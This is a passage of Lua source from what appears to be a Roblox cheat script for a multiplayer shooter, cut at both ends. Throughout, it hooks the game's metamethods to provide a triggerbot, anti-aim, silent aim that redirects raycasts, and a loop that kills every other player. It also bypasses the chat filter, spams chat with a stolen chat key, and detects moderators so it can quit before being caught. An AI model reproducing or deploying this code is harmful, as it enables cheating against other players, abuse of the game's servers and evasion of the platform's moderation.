            			local rot = arsonfuncs:RotationY(workspace.CurrentCamera.CFrame) * CFrame.Angles(0,math.rad(add),0)
            			BodyVelocity.Parent = game.Players.LocalPlayer.Character.UpperTorso
            			game.Players.LocalPlayer.Character.Humanoid.Jump = true
            			BodyVelocity.Velocity = Vector3.new(rot.LookVector.X,0,rot.LookVector.Z) * (configTable.BHopSpeed * 2)
            			if add == 0 and not UserInputService:IsKeyDown("W") then
            				BodyVelocity:Destroy()
            			end
            		end
                end
            end
    end
        if not mouseGet.Target then return end
        if not mouseGet.Target.Parent then return end
        if not configTable.Trigger then return end
        if mouseGet.Target.Parent:FindFirstChild("Humanoid") and mouseGet.Target.Parent.Name ~= player.Name and game.Players:GetPlayerFromCharacter(mouseGet.Target.Parent).Team ~= player.Team then
            mouse1press() wait(0.09) mouse1release()
        end
    end) 
    

	

	
	
	
	
local mt = getrawmetatable(game) -- 😱
local namecallold = mt.__namecall
local index = mt.__index
setreadonly(mt, false)

mt.__namecall = newcclosure(function(self, ...)
    local Args = {...}
    NamecallMethod = getnamecallmethod()
    if tostring(NamecallMethod) == "FireServer" and tostring(self) == "ControlTurn" and not checkcaller() then
        --print("The tables have turned! muhahahhahaha 🤣😱😥🥵🤓📣💀🤩😀😎")
        if configTable.AntiAim then
            if configTable.AA_METHOD == "Mental" then
                Args[1] = 1.3962564026167
                local res = math.random(1,3)
                if res == 1 then
                    Args[1] = 1.3962564026167
                    return namecallold(self, unpack(Args))

                 end
               
                if res == 2 then
                    Args[1] = -1.5962564026167
                    return namecallold(self, unpack(Args))

                end
           
                 if res == 3 then
                    Args[1] = -3.1
                    return namecallold(self, unpack(Args))

               end
            end
            
            if configTable.AA_METHOD == "Down" then
                Args[1] = -1.5962564026167
            end
            
            if configTable.AA_METHOD == "Up" then
                Args[1] = 1.5962564026167
            end
            
            if configTable.AA_METHOD == "Random" then
                Args[1] = math.random(-100,100)
            end
            
            return namecallold(self, unpack(Args))
        end
    end
    
    if self.Name == "Filter" and configTable.NoFilter and not checkcaller() then
        return Args[1]
    end
    
    
    
    if tostring(NamecallMethod) == "FireServer" and tostring(self) == "PlayerChatted" and not checkcaller() then
        chatKey = tostring(Args[1]); -- auto chat key grabber
        --print(chatKey)
        return namecallold(self, ...)
    end
    
    return namecallold(self, ...) -- i le forgoré to put this haehaeahea
end)


setreadonly(mt, true)

task.spawn(function()
    while task.wait(1) do
        
       
        
        if configTable.Spammer then
            if chatKey ~= nil then
                game:GetService("ReplicatedStorage").Events.PlayerChatted:FireServer(chatKey,configTable.ChatContext,false,true,true)
            end
        end
        if configTable.WorldAmbience then
            game.Lighting.Ambient=world.Ambient;
            game.Lighting.OutdoorAmbient=world.OutdoorAmbient;
            game.Lighting.ClockTime=world.ClockTime;
            game.Lighting.ColorShift_Top=world.ColorShift_Top;
            game.Lighting.ColorShift_Bottom=world.ColorShift_Bottom;
        end
        --[[
        if configTable.Wallbang then
            local BitBuffer = require(game.ReplicatedStorage.Modules.BitBuffer)()
            --game.ReplicatedStorage.Functions.Ping:Destroy()
            BitBuffer.writeUnsigned(64, game.Players.LocalPlayer.UserId)
            BitBuffer.writeUnsigned(9, 511)
            game.ReplicatedStorage.Events.UpdatePing:FireServer(BitBuffer.dumpString())
        end
        ]]
        
        
    end 
end)



--game:GetService('RunService').Stepped:Connect(NoclipLoop)


local ArsoniaFunctionLib={}
function ArsoniaFunctionLib:Tween(...) game:GetService("TweenService"):Create(...):Play() end
local oldNew

oldNew = hookmetamethod(game, "__namecall", function(self, ...)
    local method = getnamecallmethod()
    local args = {...}
    
    if method == "SetPrimaryPartCFrame" and self.Name == "Arms" and configTable.VMChange then
		args[1] = args[1] * CFrame.new(VMOffsets.X,VMOffsets.Y,VMOffsets.Z);

	end
	
	
	
	if self.Name == "\226\128\139HitPart" and not checkcaller() then
	   
	    
	    if args[1].Parent == arsonfuncs:GetSecureFolder() then
	        if args[1].PlayerName.Value.Character and args[1].PlayerName.Value.Character.Head ~= nil then
				arsonfuncs:KillPlayer(args[1].PlayerName.Value)
			end    
	    end
	    
	    if configTable.BTracers then
    	    spawn(function()
    	        
                local Camera = workspace.CurrentCamera
                if configTable.BType == 'old' then
            		local beam = Instance.new("Part")
            		
            		 beam.Parent = workspace.Debris;
                    beam.Name = 'U()()()()()()+45+52432+42+423+423+423+42+3423+42+3/(3+3)'
                            beam.Anchored = true
                            beam.CanCollide = false
                            beam.Material = configTable.BMaterial
                            beam.Color = configTable.BColor
                            beam.Size = Vector3.new(0.1, 0.1, (Camera.CFrame.Position - args[1].CFrame.Position).Magnitude)
                            --print(args[1])
                            beam.CFrame = CFrame.new(Camera.CFrame.Position, args[1].CFrame.Position) * CFrame.new(0, 0, -beam.Size.Z / 2)
                            ArsoniaFunctionLib:Tween(beam, TweenInfo.new(1.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Transparency = 1})
                            task.wait(1.5)
                            beam:Destroy()
                            
                else
                    local beam = beams:Clone()
                    beam.Name = 'U()()()()()()+45+52432+42+423+423+423+42+3423+42+3/(3+3)'
                    beam.FaceCamera = true;
                    beam.TextureLength = 2;
                    beam.LightInfluence = 0;
                    beam.Color = ColorSequence.new(configTable.BColor)-- converts it automatically
                    if configTable.BTexture == "default"then
                        beam.Texture = "http://www.roblox.com/asset/?id=446111271"
                        beam.Brightness = 7.4
                        beam.Transparency = NumberSequence.new(0,0)
                        beam.Segments = 1;
                        beam.CurveSize0 = 0
                        beam.CurveSize1 = 0
                        beam.Width0 = 1
                        beam.Width1 = 1 
                    end
                    if configTable.BTexture == "cum fetish"then
                        beam.Texture = "http://www.roblox.com/asset/?id=7151842823"
                        beam.Brightness = 7.4
                        beam.Transparency = NumberSequence.new(0,0)
                        beam.Segments = 1;
                        beam.CurveSize0 = 0
                        beam.CurveSize1 = 0
                        beam.Width0 = 1
                        beam.Width1 = 1 
                    end
                    if configTable.BTexture == "swag"then
                        beam.Texture = "http://www.roblox.com/asset/?id=446111271"
                        beam.Brightness = 7.4
                        beam.Transparency = NumberSequence.new(0,0)
                        beam.Segments = 1;
                        beam.CurveSize0 = 0
                        beam.CurveSize1 = 0
                        beam.Width0 = 1
                        beam.Width1 = 1 
                    end
                    if configTable.BTexture == "ok"then
                        beam.Texture = "http://www.roblox.com/asset/?id=7151778302"
                        beam.Brightness = 7.4
                        beam.Transparency = NumberSequence.new(0,0)
                        beam.Segments = 1;
                        beam.CurveSize0 = 0
                        beam.CurveSize1 = 0
                        beam.Width0 = 1
                        beam.Width1 = 1 
                    end
                    -- ^^ https://create.roblox.com/docs/reference/engine/datatypes/ColorSequence
                    beam.Parent = workspace.Debris
                    local A1 = Instance.new("Attachment") -- this will be for our humanoidrootpart
                    local A2 = Instance.new("Attachment") -- this will be for the Hit
                    beam.Attachment0 = A1
                    beam.Attachment1 = A2
                    local ViewPoint = Instance.new("Part",workspace.Ray_Ignore)
                    ViewPoint.Name = '()+goofballllll'
                    ViewPoint.Transparency = 1
                    ViewPoint.Anchored = true;
                    ViewPoint.CanCollide = false; -- oops, messed up there ! 
                    ViewPoint.CFrame = game.Players.LocalPlayer.Character.Head.CFrame;
                    ViewPoint.Size = game.Players.LocalPlayer.Character.Head.Size;
                    if args[1] then
                        local reclonedPart = args[1]:Clone()
                        reclonedPart.Name = "cloned"
                        reclonedPart.Parent = workspace.Ray_Ignore
                        reclonedPart.Anchored = true
                        reclonedPart.Transparency = 1
                        reclonedPart.CanCollide = false
                        
                        if game.Players.LocalPlayer.Character then
                            A1.Parent = ViewPoint
                            A2.Parent = reclonedPart
                        end
                        task.wait(1.5)
                        beam:Destroy()
                        A1:Destroy()
                        A2:Destroy()
                        ViewPoint:Destroy()
                        reclonedPart:Destroy()
                    end
                end
    	    end)
	    end
	    
	    if configTable.TPAura then
	        spawn(function()
	            if string.find(args[1].Name,'HeadHB') or string.find(args[1].Name,'HumanoidRootPart') or string.find(args[1].Name,'UpperTorso') or string.find(args[1].Name,'LowerTorso') or string.find(args[1].Name,'Leg') then
	                local position = args[1].CFrame
	                if configTable.TPBack then
    	                if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Spawned") then
    	                   game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = position - Vector3.new(0,0,5)     
    	                end
                    else
                        if configTable.TPStraight then
    	                    if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Spawned") then
    	                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = position      
    	                    end
    	                else
        	                if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Spawned") then
        	                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = position + Vector3.new(AuraOffsets.X,AuraOffsets.Y,AuraOffsets.Z)      
        	                end
    	                end    
                    end
	            end
	        end)     
	    end
	end
    return oldNew(self, ...)
end)


	
--arsonfuncs.PrepareInit()--:trollface:



function getSound()
    local res = nil;
    
    if configTable.Hitsound=="skeet.cc" then
        res="rbxassetid://5447626464"
    end
    
    if configTable.Hitsound=="neverlose" then
        res="rbxassetid://6607204501"
    end
    
    if configTable.Hitsound=="rust" then
        res="rbxassetid://5043539486"    
    end
    
    if configTable.Hitsound=="bag" then
        res="rbxassetid://364942410"    
    end
    
    if configTable.Hitsound=="sit" then
        writefile("sit.mp3",game:HttpGet("https://raw.githubusercontent.com/Storm99999/whitelistkeys/main/aimhook/sounds/sit.mp3?raw=true"))
        res=getsynasset("sit.mp3")   
    end
    
    if configTable.Hitsound=="reminder" then
        writefile("reminder.mp3",game:HttpGet("https://raw.githubusercontent.com/Storm99999/whitelistkeys/main/aimhook/sounds/reminder.mp3?raw=true"))
        res=getsynasset("reminder.mp3")   
    end
    
    if configTable.Hitsound=="uwu" then
        writefile("uwu.mp3",game:HttpGet("https://raw.githubusercontent.com/Storm99999/whitelistkeys/main/aimhook/sounds/uwu.mp3?raw=true"))
        res=getsynasset("uwu.mp3")   
    end
    
    if configTable.Hitsound=="zing" then
        writefile("zing.mp3",game:HttpGet("https://raw.githubusercontent.com/Storm99999/whitelistkeys/main/aimhook/sounds/animezing.mp3?raw=true"))
        res=getsynasset("zing.mp3")   
    end
    
    if configTable.Hitsound=="crowbar" then
        writefile("crowbar.mp3",game:HttpGet("https://raw.githubusercontent.com/Storm99999/whitelistkeys/main/aimhook/sounds/crowbar.mp3?raw=true"))
        res=getsynasset("crowbar.mp3")   
    end
    
    if configTable.Hitsound=="laugh" then
        writefile("laugh.mp3",game:HttpGet("https://raw.githubusercontent.com/Storm99999/whitelistkeys/main/aimhook/sounds/laugh.mp3?raw=true"))
        res=getsynasset("laugh.mp3")   
    end
    
    if configTable.Hitsound=="burp" then
        writefile("burp.mp3",game:HttpGet("https://raw.githubusercontent.com/Storm99999/whitelistkeys/main/aimhook/sounds/burp.mp3?raw=true"))
        res=getsynasset("burp.mp3")   
    end
    
    if configTable.Hitsound=="mario" then
        writefile("mario.mp3",game:HttpGet("https://raw.githubusercontent.com/Storm99999/whitelistkeys/main/aimhook/sounds/mariowoahh.mp3?raw=true"))
        res=getsynasset("mario.mp3")   
    end
    
    if configTable.Hitsound=="huh" then
        writefile("huh.mp3",game:HttpGet("https://raw.githubusercontent.com/Storm99999/whitelistkeys/main/aimhook/sounds/huhh.mp3?raw=true"))
        res=getsynasset("huh.mp3")   
    end
    if configTable.Hitsound=="ara ara" then
        writefile("ara.mp3",game:HttpGet("https://raw.githubusercontent.com/Storm99999/whitelistkeys/main/aimhook/sounds/ara.mp3?raw=true"))
        res=getsynasset("ara.mp3")   
    end
    if configTable.Hitsound=="aimhook"then
        writefile("nv.mp3",game:HttpGet("https://raw.githubusercontent.com/Storm99999/whitelistkeys/main/aimhook/sounds/Track.mp3?raw=true"))
        res=getsynasset("nv.mp3")
    end
    return res;
end

-- actual hook
game.Players.LocalPlayer.ScoreFolder.Damage:GetPropertyChangedSignal("Value"):Connect(function(current)
    if current == 0 then return end
    if not configTable.Hitsounds then return end
    
    local sound = Instance.new("Sound")
    sound.Parent = game:GetService("SoundService")
    sound.SoundId = getSound()
    sound.Volume = configTable.Volume
    sound.PlayOnRemove = true
    sound:Destroy()
end)
-- hit sound connection, everytime new match starts it gets removed.
game.Players.LocalPlayer.ScoreFolder.Kills:GetPropertyChangedSignal("Value"):Connect(function(v)
    if v == 0 then return end
    if not configTable.DeathSay then return end
    
    game:GetService("ReplicatedStorage").Events.PlayerChatted:FireServer(chatKey,'sit nn',false,false,true)
end)

game.Players.LocalPlayer.ChildRemoved:Connect(function(c)
    -- means new round started!
    
    
    if (c.Name == "ScoreFolder")then
        task.wait(3)
        
        game.Players.LocalPlayer.ScoreFolder.Damage:GetPropertyChangedSignal("Value"):Connect(function(current)
        	if current == 0 then return end
        	if not configTable.Hitsounds then return end
        
        	local sound = Instance.new("Sound")
        	sound.Parent = game:GetService("SoundService")
        	sound.SoundId = getSound()
        	sound.Volume = configTable.Volume
        	sound.PlayOnRemove = true
        	sound:Destroy()
        end)
        
        game.Players.LocalPlayer.ScoreFolder.Kills:GetPropertyChangedSignal("Value"):Connect(function(v)
            if v == 0 then return end
            if not configTable.DeathSay then return end
            
            game:GetService("ReplicatedStorage").Events.PlayerChatted:FireServer(chatKey,'sit nn',false,false,true)
        end)

    end
end)




local CurrentCamera = workspace.CurrentCamera
local Players = game.GetService(game, "Players")
local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()
function ClosestPlayer()
    local MaxDist, Closest = math.huge
    for I,V in pairs(Players.GetPlayers(Players)) do
        if V == LocalPlayer then continue end
        if V.Team == LocalPlayer then continue end
        if not V.Character then continue end
        local Head = V.Character.FindFirstChild(V.Character, "Head")
        if not Head then continue end
        local Pos, Vis = CurrentCamera.WorldToScreenPoint(CurrentCamera, Head.Position)
        if configTable.IgnoreVisibility then
            Vis = true    
        end
        if not Vis then continue end
        local MousePos, TheirPos = Vector2.new(Mouse.X, Mouse.Y), Vector2.new(Pos.X, Pos.Y)
        local Dist = (TheirPos - MousePos).Magnitude
        if Dist < MaxDist then
            MaxDist = Dist
            Closest = V
        end
    end
    return Closest
end
local OldNC
OldNC = hookmetamethod(game, "__namecall", function(self, ...)
   local Args, Method = {...}, getnamecallmethod()
    if Method == "FindPartOnRayWithIgnoreList" and not checkcaller() then
        local CP = ClosestPlayer()
        
        if not configTable.S2 then
            if CP and CP.Character and CP.Character.FindFirstChild(CP.Character, "Head") and configTable.SilentAimar then
                if configTable.SCheck then
                    if CP.TeamColor ~= game.Players.LocalPlayer.TeamColor then
                        if configTable.OnlyBT then
                            if arsonfuncs:GetSecureFolder():FindFirstChild(CP.Name) then
                                Args[1] = Ray.new(CurrentCamera.CFrame.Position, (SecureFolder[CP.Name][1].Position - CurrentCamera.CFrame.Position).Unit * 1000)
                                
                            else
                                Args[1] = Ray.new(CurrentCamera.CFrame.Position, (CP.Character[aimPart].Position - CurrentCamera.CFrame.Position).Unit * 1000)
                            end
                        else
                            Args[1] = Ray.new(CurrentCamera.CFrame.Position, (CP.Character[aimPart].Position - CurrentCamera.CFrame.Position).Unit * 1000)
                        end
                        return OldNC(self, unpack(Args))
                    end
                else
                    Args[1] = Ray.new(CurrentCamera.CFrame.Position, (CP.Character[aimPart].Position - CurrentCamera.CFrame.Position).Unit * 1000)
                    return OldNC(self, unpack(Args))
                end
            end
        else
            if CP and CP.Character and CP.Name ~= game.Players.LocalPlayer.Name and CP.Character.FindFirstChild(CP.Character, "Head") and configTable.S2 then
                if configTable.SCheck then
                    local gun = game.Players.LocalPlayer.NRPBS.EquippedTool.Value
                    if CP.TeamColor ~= game.Players.LocalPlayer.TeamColor and gun~='Rocket Launcher' and gun~='Concussion Rifle'and gun~='Arm Cannon'and gun~='RPG'and gun~='Firework Launcher' then
                        for i=0,5 do
                            arsonfuncs:KillPlayer(CP)
                        end
                    end
                else
                    for i=0,5 do
                        arsonfuncs:KillPlayer(CP)
                    end
                end
                
            end
        end
    
    end
    
    return OldNC(self, ...)
end)




local NewNotifUI = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")

--Properties:

NewNotifUI.Name = "NewNotifUI"
NewNotifUI.Parent = game:WaitForChild("CoreGui")
NewNotifUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = NewNotifUI
Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Frame.Position = UDim2.new(0.0007,5,0.081,0)
Frame.Size = UDim2.new(0, 282, 0, 39)
Frame.Visible = false;
TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.Position = UDim2.new(0.0141843967, 0, 0, 0)
TextLabel.Size = UDim2.new(0, 273, 0, 39)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "[AntiMod]: Detected: xynx2k"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 19.000
TextLabel.TextXAlignment = Enum.TextXAlignment.Left

-- Scripts:
local new=Instance.new("UIStroke",Frame)
new.Color = Color3.fromRGB(28, 53, 127)
new.Thickness=3;
local function RWEK_fake_script() -- TextLabel.LocalScript 
	local script = Instance.new('LocalScript', TextLabel)

	script.Parent.Font=Enum.Font.Code;
end
coroutine.wrap(RWEK_fake_script)()
local function TIQNHID_fake_script() -- Frame.LocalScript 
	local script = Instance.new('LocalScript', Frame)


end
coroutine.wrap(TIQNHID_fake_script)()


game.Players.PlayerAdded:connect(function(newplr)
    if configTable.Mods and newplr:IsInGroup(2613928) then
        print(newplr:GetRoleInGroup(2613928))
        if newplr:GetRoleInGroup(2613928)=="Game Moderators"then
            Frame:TweenPosition(UDim2.new(0.0007,5,0.081,0),Enum.EasingDirection.In,Enum.EasingStyle.Bounce,1.5,true,function()
		        Frame.Visible = true;
		        TextLabel.Text="Mod found,destroying instance"
		        task.wait(1)
		        game:Shutdown()
	        end)   
        end
    end
end)





game.RunService.Heartbeat:Connect(function()
    if configTable.ktype == 'heartbeat'and configTable.ForceKillAll then
        for _,v in next, game.Players:GetPlayers() do
                if game:GetService("ReplicatedStorage").wkspc.FFA.Value then
                    if v.Character and v.Name ~= game.Players.LocalPlayer.Name and v.Character:FindFirstChild("Spawned")and gun~='Rocket Launcher' and gun~='Concussion Rifle'and gun~='Arm Cannon'and gun~='RPG'and gun~='Firework Launcher' then
                        for i = 1, 10 do 
                            arsonfuncs:KillPlayer(v)
                        end
                    end
                else
                    if v.Character and v.Name ~= game.Players.LocalPlayer.Name and v.Character:FindFirstChild("Spawned") and v.TeamColor ~= game.Players.LocalPlayer.TeamColor and gun~='Rocket Launcher' and gun~='Concussion Rifle'and gun~='Arm Cannon'and gun~='RPG'and gun~='Firework Launcher' then
                        for i = 1, 10 do 
                            arsonfuncs:KillPlayer(v)
                        end
                    end   
                end
            end   
    end
    if configTable.Revive then
        --getsenv(game.Players.LocalPlayer.PlayerGui.GUI.Client).reviveme=true    
    end  
end)

